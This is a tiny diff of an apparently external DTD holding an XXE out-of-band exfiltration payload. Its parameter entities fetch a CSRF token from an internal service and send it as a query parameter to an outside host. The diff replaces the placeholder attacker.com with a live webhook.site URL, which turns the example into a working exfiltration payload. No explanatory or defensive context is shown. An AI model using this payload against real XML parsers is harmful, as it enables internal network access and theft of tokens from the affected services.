@@ -1,4 +1,4 @@
 <!ENTITY % payload SYSTEM "HTTP://internal-web:53215/internal/csrf-token">
-<!ENTITY % param1 "<!ENTITY &#x25; send SYSTEM 'HTTP://attacker.com/log?token=%payload;'>">
+<!ENTITY % param1 "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/eff02053-cf3b-4157-a23f-e2c645dd1ec9?token=%payload;'>">
 %param1;
 %send;
